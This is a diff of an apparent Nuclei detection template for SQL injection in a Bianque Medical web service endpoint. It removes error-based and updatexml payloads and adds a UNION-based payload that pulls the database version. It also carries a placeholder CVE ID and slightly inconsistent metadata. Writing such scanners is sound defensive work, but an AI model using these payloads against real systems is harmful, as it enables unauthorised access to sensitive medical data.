@@ -1,57 +1,88 @@
 id: bianque-medical-sql-injection
 
 info:
-  name: Bianque Medical SQL Injection
+  name: Bianque Medical SQL Injection (CVE-2025-XXXX)
   author: ProjectDiscoveryAI
   severity: high
   description: |
-    This template checks for an SQL injection vulnerability in the POST endpoint of the Bianque Medical application. The payload attempts to exploit the injection and verify it using a unique MD5 hash.
-  tags: sql-injection,medical
+    扁鹊医疗系统WebService接口存在SQL注入漏洞，攻击者可通过特制的SQL语句执行未授权的数据库查询。
+    该漏洞可能导致敏感医疗数据泄露和系统完整性受损。
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+    - https://cwe.mitre.org/data/definitions/89.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.1
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: bianque-medical
+    product: webservice
+  tags: cve,sqli,medical,web-service,blind-sqli
 
-flow: |
-  http(1) && http(2)
+variables:
+  num: "{{rand_int(1000, 9999)}}"
+  num2: "{{rand_int(1000, 9999)}}"
+  sum: "{{to_number(num) + to_number(num2)}}"
 
 http:
-  - id: "1"
-    raw:
+  - raw:
       - |
         POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetLyfsByParams HTTP/1.1
         Host: {{Hostname}}
-        Accept: */*
-        Accept-Encoding: gzip, deflate, br, zstd
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
         Connection: keep-alive
-        Content-Length: 198
-        Content-Type: application/x-www-form-urlencoded
-        User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.0 (KHTML, like Gecko) Chrome/24.0.809.0 Safari/534.0
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        X-Requested-With: XMLHttpRequest
 
-        strOpid=1 AND (SELECT 9054 FROM(SELECT COUNT(*),CONCAT(0x7b7e7b,(SELECT (ELT(9054=9054,1))),md5(123456),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&strTempID=1&strNumber=&strUnit=
+        strOpid={{num}}&strTempID={{num2}}&strNumber=&strUnit=
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "e10adc3949ba59abbe56e057f20f883e" # MD5 hash of '123456'
-
-      - type: status
-        status:
-          - 200
-
-  - id: "2"
-    raw:
       - |
-        GET /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetMonitorList?UserID=1&OperatorID=1&SearchName=string%27%26%26+updatexml(1,CONCAT_WS(1,1,current_user),1)+%26%26%27 HTTP/1.1
+        POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetLyfsByParams HTTP/1.1
         Host: {{Hostname}}
-        Accept: */*
-        User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.0 (KHTML, like Gecko) Chrome/24.0.809.0 Safari/534.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        X-Requested-With: XMLHttpRequest
 
-    matchers-condition: and
+        strOpid={{num}} UNION ALL SELECT NULL,CONCAT('{{randstr}}',VERSION(),'{{randstr}}'),NULL,NULL-- -&strTempID={{num2}}&strNumber=&strUnit=
+
+    req-condition: true
     matchers:
-      - type: word
-        part: body
-        words:
-          - "current_user"
+      - type: dsl
+        dsl:
+          - 'len(body_1) != len(body_2)'
+          - 'contains(body_2, "{{randstr}}")'
+        condition: and
 
       - type: status
         status:
           - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: word
+        part: body
+        words:
+          - "error"
+          - "exception"
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '{{randstr}}([0-9]+\.[0-9]+\.[0-9]+){{randstr}}'
+          - 'MariaDB'
+          - 'MySQL'
